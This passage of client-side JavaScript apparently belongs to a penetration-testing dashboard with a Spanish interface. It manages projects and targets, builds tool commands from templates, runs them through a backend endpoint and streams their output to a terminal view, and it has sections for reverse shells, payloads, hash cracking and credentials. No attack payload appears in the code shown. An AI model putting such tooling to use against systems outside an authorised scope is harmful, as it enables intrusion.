'use strict';

// ── Output cache (must be at top to avoid TDZ with const) ─────────────────
const JOBS_OUTPUT_CACHE = {};

// ── State ──────────────────────────────────────────────────────────────────
const state = {
    projects: [],
    activeProject: null,
    allTools: [],
    displayedTools: [],
    activeTool: null,
    activePhase: 'recon',
    globalVars: { lhost: '', lport: '4444', rhost: '', domain: '' },
    jobs: [],
    selectedJobId: null,
    activeEventSource: null,
    termAutoScroll: true,
    parsedLootItems: [],
    workflows: [],
    selectedWorkflow: null,
    editingFindingId: null,
    // Map
    networkMap: null,
    mapNodes: null,
    mapEdges: null,
    selectedMapNode: null,
    mapExtraHosts: [],
    mapKnownNodeIds: new Set(),
    // Timeline
    timelineEvents: [],
    timelineFilter: 'all',
    // Editor
    currentYamlFile: null,
    // Schedules
    schedules: [],
    // Port Map
    ports: [],
    // Credential Matrix
    credMatrix: { users: [], services: [], results: {} },
    // Attack Path
    attackPath: null,
    attackPathNodes: null,
    attackPathEdges: null,
    // Wordlist Browser
    wlBrowserTarget: null,
    wlSelectedPath: null,
    // xterm.js
    xterminal: null,
    xtermFitAddon: null,
    // Dashboard charts
    dashCharts: {},
    // Full Recon
    fullReconActive: false,
    fullReconSteps: [],
    _lastAutoParseResult: null,
    _lastParsedPorts: [],
    activeCatFilter: '',
};

// ── Sidebar toggle ─────────────────────────────────────────────────────────
function toggleSidebar() {
    const sidebar = document.querySelector('.sidebar');
    const btn = document.getElementById('sidebar-toggle-btn');
    if (!sidebar) return;
    const collapsed = sidebar.classList.toggle('collapsed');
    if (btn) btn.querySelector('i').className = collapsed ? 'fas fa-indent' : 'fas fa-bars';
    localStorage.setItem('sb-collapsed', collapsed ? '1' : '0');
    // Refit terminal after animation
    setTimeout(() => {
        if (typeof fitAddon !== 'undefined' && fitAddon) { try { fitAddon.fit(); } catch(e) {} }
    }, 220);
}

// ── Nav Group toggle ───────────────────────────────────────────────────────
function toggleNavGroup(header) {
    const items = header.nextElementSibling;
    const isCollapsed = items.classList.contains('collapsed');
    items.classList.toggle('collapsed', !isCollapsed);
    header.classList.toggle('collapsed', !isCollapsed);
}

// ── Bootstrap modals ───────────────────────────────────────────────────────
let bsNewProject, bsCommand, bsProjectInfo, bsNotes, bsLoot, bsWorkflow, bsParsedLoot, bsFinding,
    bsMultiTarget, bsSchedule, bsSearch, bsDiff, bsAddHost, bsNewYaml,
    bsAddPort, bsTakeScreenshot, bsHashCracker, bsWordlistBrowser, bsMatrixConfig,
    bsPathNode, bsPathEdge, bsTrends, bsTransfer, bsNewListener,
    bsScope, bsEvidenceCollect, bsAddSnippet;

document.addEventListener('DOMContentLoaded', () => {
    bsNewProject  = new bootstrap.Modal('#modalNewProject');
    bsCommand     = new bootstrap.Modal('#modalCommand');
    bsProjectInfo = new bootstrap.Modal('#modalProjectInfo');
    bsNotes       = new bootstrap.Modal('#modalNotes');
    bsLoot        = new bootstrap.Modal('#modalLoot');
    bsWorkflow    = new bootstrap.Modal('#modalWorkflow');
    bsParsedLoot  = new bootstrap.Modal('#modalParsedLoot');
    bsFinding     = new bootstrap.Modal('#modalFinding');
    bsMultiTarget = new bootstrap.Modal('#modalMultiTarget');
    bsSchedule    = new bootstrap.Modal('#modalSchedule');
    bsSearch      = new bootstrap.Modal('#modalSearch');
    bsDiff        = new bootstrap.Modal('#modalDiff');
    bsAddHost     = new bootstrap.Modal('#modalAddHost');
    bsNewYaml     = new bootstrap.Modal('#modalNewYaml');
    bsAddPort     = new bootstrap.Modal('#modalAddPort');
    bsTakeScreenshot = new bootstrap.Modal('#modalTakeScreenshot');
    bsHashCracker = new bootstrap.Modal('#modalHashCracker');
    bsWordlistBrowser = new bootstrap.Modal('#modalWordlistBrowser');
    bsMatrixConfig = new bootstrap.Modal('#modalMatrixConfig');
    bsPathNode    = new bootstrap.Modal('#modalPathNode');
    bsPathEdge    = new bootstrap.Modal('#modalPathEdge');
    bsTrends      = new bootstrap.Modal('#modalTrends');
    bsTransfer         = new bootstrap.Modal('#modalTransfer');
    bsNewListener      = new bootstrap.Modal('#modalNewListener');
    bsScope            = new bootstrap.Modal('#modalScope');
    bsEvidenceCollect  = new bootstrap.Modal('#modalEvidenceCollector');
    bsAddSnippet       = new bootstrap.Modal('#modalAddSnippet');

    // Restore sidebar collapsed state
    if (localStorage.getItem('sb-collapsed') === '1') {
        const sidebar = document.querySelector('.sidebar');
        const btn = document.getElementById('sidebar-toggle-btn');
        if (sidebar) sidebar.classList.add('collapsed');
        if (btn) btn.querySelector('i').className = 'fas fa-indent';
    }

    loadGlobalVars();
    loadProjects();
    loadWorkflows();
    startJobsPolling();

    // Category filter buttons (recon phase)
    document.querySelectorAll('.cat-filter-btn').forEach(btn => {
        btn.addEventListener('click', () => setCatFilter(btn.dataset.cat));
    });

    // Ctrl+K → global search
    document.addEventListener('keydown', e => {
        if ((e.ctrlKey || e.metaKey) && e.key === 'k') {
            e.preventDefault();
            document.getElementById('global-search-input').value = '';
            document.getElementById('global-search-results').innerHTML = '';
            bsSearch.show();
            setTimeout(() => document.getElementById('global-search-input').focus(), 200);
        }
        // Ctrl+S → save YAML
        if ((e.ctrlKey || e.metaKey) && e.key === 's' && state.activePhase === 'editor') {
            e.preventDefault();
            saveYAML();
        }
    });
});

// ── Global Vars ────────────────────────────────────────────────────────────

function loadGlobalVars() {
    const saved = localStorage.getItem('pentest_global_vars');
    if (saved) {
        try { state.globalVars = { ...state.globalVars, ...JSON.parse(saved) }; } catch {}
    }
    ['lhost', 'lport', 'rhost', 'domain'].forEach(k => {
        const el = document.getElementById(`gv-${k}`);
        if (el) el.value = state.globalVars[k] || '';
    });
}

function saveGlobalVar(key, value) {
    state.globalVars[key] = value;
    localStorage.setItem('pentest_global_vars', JSON.stringify(state.globalVars));
    if (state.activePhase === 'revshells') renderRevShells();
}

// ── Projects ───────────────────────────────────────────────────────────────

async function loadProjects() {
    const res = await fetch('/api/projects');
    state.projects = await res.json();
    renderSidebar();
}

function renderSidebar() {
    const el = document.getElementById('projects-list');
    if (!state.projects.length) {
        el.innerHTML = '<div class="text-muted small p-3">Sin proyectos aún</div>';
        return;
    }
    el.innerHTML = state.projects.map(p => `
        <div class="project-item ${state.activeProject?.id === p.id ? 'active' : ''}"
             onclick="selectProject('${p.id}')">
            <div class="pi-name">${h(p.name)}</div>
            <div class="pi-meta">${h(p.client || 'Sin cliente')} · ${fmtDate(p.created_at)}</div>
        </div>
    `).join('');
}

async function selectProject(id) {
    const res = await fetch(`/api/projects/${id}`);
    state.activeProject = await res.json();
    renderSidebar();
    document.getElementById('empty-view').classList.add('d-none');
    document.getElementById('project-view').classList.remove('d-none');
    document.getElementById('ph-name').textContent = state.activeProject.name;
    updateTargetsBadge();
    document.getElementById('nav-project-name').textContent = state.activeProject.name;
    if (!state.globalVars.rhost) {
        const first = (state.activeProject.targets || [])[0];
        if (first) { state.globalVars.rhost = first; const el = document.getElementById('gv-rhost'); if (el) el.value = first; }
    }
    if (!state.globalVars.domain) {
        const first = (state.activeProject.domains || [])[0];
        if (first) { state.globalVars.domain = first; const el = document.getElementById('gv-domain'); if (el) el.value = first; }
    }
    loadPhase('dashboard');
}

function updateTargetsBadge() {
    const targets = [...(state.activeProject.targets || []), ...(state.activeProject.domains || [])].join(', ');
    document.getElementById('ph-targets').textContent = targets || 'Sin targets definidos';
}

function showNewProjectModal() {
    ['np-name','np-client','np-targets','np-domains','np-scope'].forEach(id => { document.getElementById(id).value = ''; });
    bsNewProject.show();
}

async function createProject() {
    const name = document.getElementById('np-name').value.trim();
    if (!name) { toast('El nombre es obligatorio', 'error'); return; }
    const split = v => document.getElementById(v).value.split(',').map(s => s.trim()).filter(Boolean);
    const res = await fetch('/api/projects', {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({ name, client: document.getElementById('np-client').value.trim(), targets: split('np-targets'), domains: split('np-domains'), scope: document.getElementById('np-scope').value.trim() }),
    });
    const project = await res.json();
    bsNewProject.hide();
    await loadProjects();
    selectProject(project.id);
    toast('Proyecto creado', 'success');
}

function confirmDeleteProject() {
    if (!state.activeProject) return;
    if (!confirm(`¿Eliminar el proyecto "${state.activeProject.name}"? Esta acción no se puede deshacer.`)) return;
    deleteProject();
}

async function deleteProject() {
    await fetch(`/api/projects/${state.activeProject.id}`, { method: 'DELETE' });
    state.activeProject = null;
    document.getElementById('project-view').classList.add('d-none');
    document.getElementById('empty-view').classList.remove('d-none');
    document.getElementById('nav-project-name').textContent = '';
    await loadProjects();
    toast('Proyecto eliminado', 'info');
}

// ── Project Info ────────────────────────────────────────────────────────────

function showProjectInfoModal() {
    const p = state.activeProject;
    const checklist = p.checklist || {};
    const done = OSCP_CHECKLIST.filter(i => checklist[i.id]).length;
    document.getElementById('project-info-body').innerHTML = `
        <table class="table table-sm info-table">
            <tr><td>Nombre</td><td>${h(p.name)}</td></tr>
            <tr><td>Cliente</td><td>${h(p.client || '—')}</td></tr>
            <tr><td>IPs / Rangos</td><td>${h((p.targets||[]).join(', ') || '—')}</td></tr>
            <tr><td>Dominios</td><td>${h((p.domains||[]).join(', ') || '—')}</td></tr>
            <tr><td>Creado</td><td>${fmtDate(p.created_at)}</td></tr>
            <tr><td>Comandos guardados</td><td>${(p.commands||[]).length}</td></tr>
            <tr><td>Loot</td><td>${(p.loot||[]).length} items</td></tr>
            <tr><td>Findings</td><td>${(p.findings||[]).length}</td></tr>
            <tr><td>Checklist</td><td>${done}/${OSCP_CHECKLIST.length} completados</td></tr>
            <tr><td>Scope</td><td>${h(p.scope || '—')}</td></tr>
        </table>`;
    bsProjectInfo.show();
}

// ── Notes ────────────────────────────────────────────────────────────────────

function showNotesModal() {
    document.getElementById('notes-textarea').value = state.activeProject.notes || '';
    bsNotes.show();
}

async function saveNotes() {
    const notes = document.getElementById('notes-textarea').value;
    await fetch(`/api/projects/${state.activeProject.id}`, { method: 'PUT', headers: { 'Content-Type': 'application/json' }, body: JSON.stringify({ notes }) });
    state.activeProject.notes = notes;
    bsNotes.hide();
    toast('Notas guardadas', 'success');
}

// ── Phases & Tools ─────────────────────────────────────────────────────────

const SPECIAL_PHASES = ['dashboard', 'history', 'revshells', 'loot', 'checklist', 'terminal', 'findings', 'map', 'timeline', 'editor', 'ports', 'payloads', 'matrix', 'shots', 'path', 'auto', 'cve', 'sessions', 'bloodhound', 'ldap', 'osint', 'snippets', 'tunnels', 'ai', 'autopilot'];

async function loadPhase(phase) {
    state.activePhase = phase;

    document.querySelectorAll('#phase-tabs .nav-link').forEach(btn => {
        btn.classList.toggle('active', btn.dataset.phase === phase);
    });

    // Update sidebar nav items
    document.querySelectorAll('.nav-item[data-phase]').forEach(btn => {
        btn.classList.toggle('active', btn.dataset.phase === phase);
    });
    // Auto-expand group containing active item
    document.querySelectorAll('.nav-item[data-phase]').forEach(btn => {
        if (btn.dataset.phase === phase) {
            const group = btn.closest('.nav-group');
            if (group) {
                const items = group.querySelector('.nav-group-items');
                const header = group.querySelector('.nav-group-header');
                if (items) items.classList.remove('collapsed');
                if (header) header.classList.remove('collapsed');
            }
        }
    });

    const allViews = ['dashboard-view','tools-view','history-view','revshells-view','loot-view','checklist-view','terminal-view','findings-view','map-view','timeline-view','editor-view','ports-view','payloads-view','matrix-view','shots-view','path-view','auto-view','cve-view','sessions-view','bloodhound-view','ldap-view','osint-view','snippets-view','tunnels-view','ai-view','autopilot-view'];
    allViews.forEach(id => { const el = document.getElementById(id); if (el) el.classList.add('d-none'); });

    const searchInput = document.getElementById('tool-search');
    const mainContent = document.getElementById('main-content');
    const projectView = document.getElementById('project-view');

    // Terminal needs special layout
    if (phase === 'terminal') {
        mainContent.classList.add('content-terminal');
        projectView.classList.add('project-view-terminal');
    } else {
        mainContent.classList.remove('content-terminal');
        projectView.classList.remove('project-view-terminal');
    }

    if (phase === 'dashboard') {
        document.getElementById('dashboard-view').classList.remove('d-none');
        searchInput.style.display = 'none';
        await loadDashboard();
        return;
    }
    if (phase === 'history') {
        document.getElementById('history-view').classList.remove('d-none');
        searchInput.style.display = 'none';
        renderHistory();
        return;
    }
    if (phase === 'revshells') {
        document.getElementById('revshells-view').classList.remove('d-none');
        searchInput.style.display = 'none';
        renderRevShells();
        return;
    }
    if (phase === 'loot') {
        document.getElementById('loot-view').classList.remove('d-none');
        searchInput.style.display = 'none';
        renderLoot();
        return;
    }
    if (phase === 'findings') {
        document.getElementById('findings-view').classList.remove('d-none');
        searchInput.style.display = 'none';
        renderFindings();
        return;
    }
    if (phase === 'checklist') {
        document.getElementById('checklist-view').classList.remove('d-none');
        searchInput.style.display = 'none';
        renderChecklist();
        return;
    }
    if (phase === 'terminal') {
        document.getElementById('terminal-view').classList.remove('d-none');
        searchInput.style.display = 'none';
        await loadTerminal();
        return;
    }
    if (phase === 'map') {
        document.getElementById('map-view').classList.remove('d-none');
        searchInput.style.display = 'none';
        mainContent.classList.add('content-terminal');
        projectView.classList.add('project-view-terminal');
        renderNetworkMap();
        return;
    }
    if (phase === 'timeline') {
        document.getElementById('timeline-view').classList.remove('d-none');
        searchInput.style.display = 'none';
        await loadTimeline();
        return;
    }
    if (phase === 'editor') {
        document.getElementById('editor-view').classList.remove('d-none');
        searchInput.style.display = 'none';
        mainContent.classList.add('content-terminal');
        projectView.classList.add('project-view-terminal');
        loadYAMLFileList();
        return;
    }
    if (phase === 'ports') {
        document.getElementById('ports-view').classList.remove('d-none');
        searchInput.style.display = 'none';
        await loadPortMap();
        return;
    }
    if (phase === 'payloads') {
        document.getElementById('payloads-view').classList.remove('d-none');
        searchInput.style.display = 'none';
        initPayloadVars();
        renderPayloads();
        return;
    }
    if (phase === 'matrix') {
        document.getElementById('matrix-view').classList.remove('d-none');
        searchInput.style.display = 'none';
        await loadCredMatrix();
        return;
    }
    if (phase === 'shots') {
        document.getElementById('shots-view').classList.remove('d-none');
        searchInput.style.display = 'none';
        await loadScreenshots();
        return;
    }
    if (phase === 'path') {
        document.getElementById('path-view').classList.remove('d-none');
        searchInput.style.display = 'none';
        mainContent.classList.add('content-terminal');
        projectView.classList.add('project-view-terminal');
        await loadAttackPath();
        return;
    }
    if (phase === 'auto') {
        document.getElementById('auto-view').classList.remove('d-none');
        searchInput.style.display = 'none';
        await loadAutoView();
        return;
    }
    if (phase === 'cve') {
        document.getElementById('cve-view').classList.remove('d-none');
        searchInput.style.display = 'none';
        return;
    }
    if (phase === 'sessions') {
        document.getElementById('sessions-view').classList.remove('d-none');
        searchInput.style.display = 'none';
        await loadSessionsView();
        return;
    }
    if (phase === 'bloodhound') {
        document.getElementById('bloodhound-view').classList.remove('d-none');
        searchInput.style.display = 'none';
        mainContent.classList.add('content-terminal');
        projectView.classList.add('project-view-terminal');
        await loadBloodHoundView();
        return;
    }
    if (phase === 'ldap') {
        document.getElementById('ldap-view').classList.remove('d-none');
        searchInput.style.display = 'none';
        prefillLdapFromProject();
        return;
    }
    if (phase === 'osint') {
        document.getElementById('osint-view').classList.remove('d-none');
        searchInput.style.display = 'none';
        prefillOsintDomain();
        return;
    }
    if (phase === 'snippets') {
        document.getElementById('snippets-view').classList.remove('d-none');
        searchInput.style.display = 'none';
        await loadSnippets();
        return;
    }
    if (phase === 'tunnels') {
        document.getElementById('tunnels-view').classList.remove('d-none');
        searchInput.style.display = 'none';
        await loadTunnelTemplates();
        await loadTunnelJobs();
        return;
    }
    if (phase === 'ai') {
        document.getElementById('ai-view').classList.remove('d-none');
        searchInput.style.display = 'none';
        checkOllamaStatus();
        document.getElementById('ai-type').onchange = () => {
            const isCustom = document.getElementById('ai-type').value === 'custom';
            document.getElementById('ai-custom-prompt-row').classList.toggle('d-none', !isCustom);
        };
        return;
    }
    if (phase === 'autopilot') {
        document.getElementById('autopilot-view').classList.remove('d-none');
        searchInput.style.display = 'none';
        loadAutopilot();
        return;
    }

    document.getElementById('tools-view').classList.remove('d-none');
    searchInput.style.display = '';
    searchInput.value = '';

    // Show category filter bar only for recon phase
    const catBar = document.getElementById('recon-cat-filters');
    catBar.classList.toggle('d-none', phase !== 'recon');
    state.activeCatFilter = '';
    document.querySelectorAll('.cat-filter-btn').forEach(b => b.classList.toggle('active', b.dataset.cat === ''));

    const res = await fetch(`/api/tools?phase=${phase}`);
    state.allTools = await res.json();
    state.displayedTools = [...state.allTools];
    renderGrid(state.displayedTools);
}

function filterTools() {
    const q = document.getElementById('tool-search').value.toLowerCase().trim();
    const cat = state.activeCatFilter;
    state.displayedTools = state.allTools.filter(t => {
        const matchQ = !q || t.name.toLowerCase().includes(q) || t.description.toLowerCase().includes(q) || (t.tags || []).some(tag => tag.toLowerCase().includes(q));
        const matchCat = !cat || (t.tags || []).includes(cat);
        return matchQ && matchCat;
    });
    renderGrid(state.displayedTools);
}

function setCatFilter(cat) {
    state.activeCatFilter = cat;
    document.querySelectorAll('.cat-filter-btn').forEach(b => b.classList.toggle('active', b.dataset.cat === cat));
    filterTools();
}

function renderGrid(tools) {
    const grid = document.getElementById('tools-grid');
    if (!tools.length) {
        grid.innerHTML = `<div class="col-12 text-center text-muted py-5"><i class="fas fa-magnifying-glass fa-2x mb-2 d-block"></i>No se encontraron herramientas</div>`;
        return;
    }
    grid.innerHTML = tools.map((tool, idx) => `
        <div class="col-md-6 col-xl-4">
            <div class="tool-card phase-${h(tool.phase)}">
                <div class="tool-name">${h(tool.name)}</div>
                <div class="tool-desc">${h(tool.description)}</div>
                <div class="tool-cmd-preview">${h(tool.command)}</div>
                <div class="tool-tags">${(tool.tags||[]).map(t => `<span class="tag">${h(t)}</span>`).join('')}</div>
                <button class="btn btn-sm btn-outline-success w-100 mt-auto" onclick="openCommandBuilder(${idx})">
                    <i class="fas fa-terminal"></i> Construir comando
                </button>
            </div>
        </div>
    `).join('');
}

// ── Command Builder ────────────────────────────────────────────────────────

function openCommandBuilder(idx) {
    const tool = state.displayedTools[idx];
    state.activeTool = tool;
    document.getElementById('cmd-title').textContent = tool.name;
    document.getElementById('cmd-desc').textContent  = tool.description;
    const notesWrap = document.getElementById('cmd-notes-wrap');
    if (tool.notes) { document.getElementById('cmd-notes-text').textContent = tool.notes; notesWrap.classList.remove('d-none'); }
    else notesWrap.classList.add('d-none');

    const firstTarget = (state.activeProject?.targets || [])[0] || '';
    const firstDomain = (state.activeProject?.domains || [])[0] || '';
    const gv = state.globalVars;

    const paramsHtml = (tool.params || []).map(param => {
        let defVal = param.default || '';
        const n = param.name.toLowerCase();
        if (!defVal) {
            if (n === 'lhost') defVal = gv.lhost || '';
            else if (n === 'lport') defVal = gv.lport || '';
            else if (['rhost','target','ip','host','dc_ip','dc','server'].includes(n)) defVal = gv.rhost || firstTarget;
            else if (n === 'domain') defVal = gv.domain || firstDomain;
        }
        return `<div class="mb-3">
            <label class="form-label">${h(param.label)}${param.required ? ' <span class="text-danger">*</span>' : ''}</label>
            <input type="text" class="form-control" data-param="${h(param.name)}" placeholder="${h(param.placeholder || '')}"
                   value="${h(defVal)}" oninput="updatePreview()">
            ${param.description ? `<div class="form-text">${h(param.description)}</div>` : ''}
        </div>`;
    }).join('') || '<p class="text-muted small">Este comando no requiere parámetros.</p>';

    document.getElementById('cmd-params').innerHTML = paramsHtml;
    updatePreview();
    bsCommand.show();
}

function updatePreview() {
    if (!state.activeTool) return;
    let cmd = state.activeTool.command;
    document.querySelectorAll('#cmd-params input[data-param]').forEach(input => {
        const val = input.value || `{${input.dataset.param}}`;
        cmd = cmd.split(`{${input.dataset.param}}`).join(val);
    });
    document.getElementById('cmd-output').textContent = cmd;
}

function getBuiltCommand() { return document.getElementById('cmd-output').textContent; }
function copyCommand() { navigator.clipboard.writeText(getBuiltCommand()).then(() => toast('Copiado al portapapeles', 'success')); }
function copyAndClose() { copyCommand(); bsCommand.hide(); }

async function saveToHistory() {
    if (!state.activeProject || !state.activeTool) return;
    const cmd = getBuiltCommand();
    const commands = [...(state.activeProject.commands || []), {
        id: crypto.randomUUID(), tool: state.activeTool.name, phase: state.activeTool.phase,
        command: cmd, timestamp: new Date().toISOString(),
    }];
    const res = await fetch(`/api/projects/${state.activeProject.id}`, { method: 'PUT', headers: { 'Content-Type': 'application/json' }, body: JSON.stringify({ commands }) });
    state.activeProject = await res.json();
    toast('Guardado en historial', 'success');
    copyCommand();
    bsCommand.hide();
}

// ── Command Execution (T1) ─────────────────────────────────────────────────

async function executeCommand() {
    if (!state.activeProject || !state.activeTool) return;
    const cmd = getBuiltCommand();
    const tool = state.activeTool;
    bsCommand.hide();
    toast(`Ejecutando: ${tool.name}`, 'info');
    await loadPhase('terminal');
    const res = await fetch('/api/run', {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({ command: cmd, tool: tool.name, phase: tool.phase, project_id: state.activeProject.id }),
    });
    const { job_id } = await res.json();
    await refreshJobsList();
    selectJob(job_id);
}

async function runDirectCommand() {
    if (!state.activeProject) return;
    const input = document.getElementById('term-cmd-input');
    const cmd = input.value.trim();
    if (!cmd) return;
    input.value = '';
    const res = await fetch('/api/run', {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({ command: cmd, tool: cmd.split(' ')[0], phase: 'custom', project_id: state.activeProject.id }),
    });
    const { job_id } = await res.json();
    await refreshJobsList();
    selectJob(job_id);
}

// ── Terminal (T1) ──────────────────────────────────────────────────────────

async function loadTerminal() {
    renderWorkflowsStrip();
    _initXterm();
    await refreshJobsList();
    if (state.selectedJobId) {
        const job = state.jobs.find(j => j.id === state.selectedJobId);
        if (job) selectJob(state.selectedJobId);
    }
}

function _initXterm() {
    if (state.xterminal) {
        // Already created — just fit to current size
        requestAnimationFrame(() => state.xtermFitAddon?.fit());
        return;
    }
    const container = document.getElementById('xterm-container');
    if (!container || typeof Terminal === 'undefined') return;

    const term = new Terminal({
        theme: {
            background:   '#0a0e14',
            foreground:   '#c9d1d9',
            cursor:       '#3fb950',
            cursorAccent: '#0a0e14',
            black:   '#21262d', red:     '#f85149', green:  '#3fb950', yellow: '#d29922',
            blue:    '#58a6ff', magenta: '#bc8cff', cyan:   '#39c5cf', white:  '#c9d1d9',
            brightBlack:   '#8b949e', brightRed:    '#ff7b72', brightGreen:  '#56d364',
            brightYellow:  '#e3b341', brightBlue:   '#79c0ff', brightMagenta:'#d2a8ff',
            brightCyan:    '#56d4dd', brightWhite:  '#ffffff',
        },
        fontFamily: "'Cascadia Code', 'Fira Code', 'Courier New', monospace",
        fontSize: 13,
        lineHeight: 1.4,
        convertEol: true,
        scrollback: 10000,
        cursorBlink: true,
        allowTransparency: false,
        disableStdin: true,
    });

    const fitAddon = new FitAddon.FitAddon();
    term.loadAddon(fitAddon);

    if (typeof WebLinksAddon !== 'undefined') {
        term.loadAddon(new WebLinksAddon.WebLinksAddon());
    }

    term.open(container);
    fitAddon.fit();

    state.xterminal = term;
    state.xtermFitAddon = fitAddon;

    const ro = new ResizeObserver(() => { fitAddon.fit(); });
    ro.observe(container);
}

async function refreshJobsList() {
    if (!state.activeProject) return;
    const res = await fetch(`/api/jobs?project_id=${state.activeProject.id}`);
    state.jobs = await res.json();
    renderJobsList();
    updateRunningIndicator();
}

function renderJobsList() {
    const el = document.getElementById('jobs-list');
    if (!state.jobs.length) {
        el.innerHTML = '<div class="text-muted small p-3">Sin jobs activos</div>';
        return;
    }
    el.innerHTML = state.jobs.map(job => {
        const icon = JOB_STATUS_ICONS[job.status] || '<i class="fas fa-circle text-muted"></i>';
        const isActive = job.id === state.selectedJobId;
        const elapsed = job.finished_at
            ? fmtElapsed(job.started_at, job.finished_at)
            : fmtElapsed(job.started_at, new Date().toISOString()) + '...';
        return `
            <div class="job-item ${isActive ? 'active' : ''} job-${job.status}" data-job-id="${h(job.id)}" onclick="selectJob('${h(job.id)}')">
                <div class="job-status-icon">${icon}</div>
                <div class="job-info flex-grow-1 min-width-0">
                    <div class="job-name">${h(job.tool)}</div>
                    <div class="job-meta">${h(elapsed)} · ${h(job.line_count || 0)} lines</div>
                </div>
            </div>`;
    }).join('');
}

const JOB_STATUS_ICONS = {
    running:   '<span class="spinner-pulse-sm"></span>',
    completed: '<i class="fas fa-circle-check text-success" style="font-size:11px"></i>',
    error:     '<i class="fas fa-circle-xmark text-danger" style="font-size:11px"></i>',
    stopped:   '<i class="fas fa-circle-stop text-warning" style="font-size:11px"></i>',
};

async function selectJob(jobId) {
    state.selectedJobId = jobId;
    renderJobsList();

    const res = await fetch(`/api/jobs/${jobId}`);
    const job = await res.json();

    document.getElementById('term-no-selection').classList.add('d-none');
    document.getElementById('term-job-info').classList.remove('d-none');
    document.getElementById('term-job-name').textContent = job.tool;
    document.getElementById('term-job-cmd').textContent  = job.command;
    document.getElementById('term-job-status-icon').innerHTML = JOB_STATUS_ICONS[job.status] || '';

    document.getElementById('btn-stop-job').classList.toggle('d-none', job.status !== 'running');
    document.getElementById('btn-parse-output').classList.toggle('d-none', job.status === 'running');

    // Clear xterm and load history
    if (state.xterminal) {
        state.xterminal.reset();
    }
    state.termAutoScroll = true;
    _updateAutoscrollBtn(true);
    _nmapProgressReset();

    JOBS_OUTPUT_CACHE[jobId] = [...job.output];
    if (state.xterminal) {
        // Write all historical lines at once for performance
        const blob = job.output.join('\r\n') + (job.output.length ? '\r\n' : '');
        state.xterminal.write(blob);
        if (state.termAutoScroll) state.xterminal.scrollToBottom();
    }
    // Parse nmap progress from existing output
    job.output.forEach(l => _nmapProgressParse(l));

    if (job.status === 'running') {
        startSSEStream(jobId, job.total_lines);
    } else {
        _nmapProgressReset();
    }
}

// ── xterm helpers ──────────────────────────────────────────────
function appendTermLine(line) {
    if (state.xterminal) {
        state.xterminal.writeln(line);
        if (state.termAutoScroll) state.xterminal.scrollToBottom();
    }
    _nmapProgressParse(line);
}

// ── nmap progress bar ─────────────────────────────────────────
function _nmapProgressParse(line) {
    const clean = line.replace(/\x1b\[[0-9;]*[A-Za-z]/g, '');
    const m = clean.match(/About\s+([\d.]+)%\s+done(?:;\s*ETC:\s*[\d:]+\s*\(([^)]+)\s+remaining\))?/i);
    if (!m) return;
    const pct = parseFloat(m[1]);
    const rem = m[2] || '';
    const wrap = document.getElementById('nmap-progress-wrap');
    const bar  = document.getElementById('nmap-progress-bar');
    const lbl  = document.getElementById('nmap-progress-label');
    const etc  = document.getElementById('nmap-progress-etc');
    if (!wrap) return;
    wrap.classList.remove('d-none');
    bar.style.width = pct + '%';
    lbl.textContent = pct.toFixed(1) + '%';
    etc.textContent = rem ? rem + ' restante' : '';
}

function _nmapProgressReset() {
    const wrap = document.getElementById('nmap-progress-wrap');
    if (wrap) wrap.classList.add('d-none');
    const bar = document.getElementById('nmap-progress-bar');
    if (bar) bar.style.width = '0%';
}

function startSSEStream(jobId, offset) {
    if (state.activeEventSource) { state.activeEventSource.close(); state.activeEventSource = null; }
    const es = new EventSource(`/api/jobs/${jobId}/stream?offset=${offset}`);
    state.activeEventSource = es;
    es.onmessage = (e) => {
        if (!JOBS_OUTPUT_CACHE[jobId]) JOBS_OUTPUT_CACHE[jobId] = [];
        JOBS_OUTPUT_CACHE[jobId].push(e.data);
        if (state.selectedJobId === jobId) appendTermLine(e.data);
    };
    es.addEventListener('done', async (ev) => {
        es.close();
        state.activeEventSource = null;
        _nmapProgressReset();
        refreshJobsList();
        if (state.selectedJobId === jobId) {
            document.getElementById('btn-stop-job').classList.add('d-none');
            document.getElementById('btn-parse-output').classList.remove('d-none');
        }
        // ── Auto-parse on completion ──────────────────────────────
        const job = state.jobs.find(j => j.id === jobId) || { status: ev.data };
        if (ev.data !== 'stopped' && state.activeProject) {
            await _autoParseAndSave(jobId);
        }
        // Notify Full Recon orchestrator
        if (state.fullReconActive) _fullReconJobDone(jobId, ev.data);
    });
    es.onerror = () => {
        es.close();
        state.activeEventSource = null;
        _nmapProgressReset();
    };
}

function startJobsPolling() {
    let _prevFindingsCount = 0;
    setInterval(async () => {
        if (state.activePhase === 'terminal' && state.activeProject) {
            await refreshJobsList();
        }
        updateRunningIndicator();

        // Auto-refresh findings + ports when a workflow is running
        const runningCount = state.jobs.filter(j => j.status === 'running').length;
        if (runningCount > 0 && state.activeProject) {
            try {
                const res = await fetch(`/api/projects/${state.activeProject.id}/findings`);
                if (res.ok) {
                    const fresh = await res.json();
                    const oldCount = _prevFindingsCount < 0
                        ? fresh.length  // first tick: set baseline silently
                        : _prevFindingsCount;
                    _prevFindingsCount = fresh.length;
                    if (fresh.length !== oldCount) {
                        state.activeProject.findings = fresh;
                        if (state.activePhase === 'findings') renderFindings();
                        if (fresh.length > oldCount) {
                            toast(`+${fresh.length - oldCount} finding(s) auto-detectado(s)`, 'success');
                        }
                    }
                }
                const pr = await fetch(`/api/projects/${state.activeProject.id}`);
                if (pr.ok) {
                    const proj = await pr.json();
                    if ((proj.port_map || []).length !== (state.activeProject.port_map || []).length) {
                        state.activeProject.port_map = proj.port_map || [];
                    }
                }
            } catch (_) {}
        } else {
            _prevFindingsCount = -1;  // reset when no workflows running
        }
    }, 3000);
}

function updateRunningIndicator() {
    const runningCount = state.jobs.filter(j => j.status === 'running').length;
    // Legacy navbar indicator (kept for compatibility; navbar no longer shows it but element may exist)
    const indicator = document.getElementById('jobs-running-indicator');
    const countEl   = document.getElementById('jobs-running-count');
    if (indicator) {
        if (runningCount > 0) {
            indicator.classList.remove('d-none');
            if (countEl) countEl.textContent = runningCount;
        } else {
            indicator.classList.add('d-none');
        }
    }
    // New inline indicator in project header
    const indicatorInline = document.getElementById('jobs-running-indicator-inline');
    const countElInline   = document.getElementById('jobs-running-count-inline');
    if (indicatorInline) {
        if (runningCount > 0) {
            indicatorInline.classList.remove('d-none');
            if (countElInline) countElInline.textContent = runningCount;
        } else {
            indicatorInline.classList.add('d-none');
        }
    }
}

async function stopSelectedJob() {
    if (!state.selectedJobId) return;
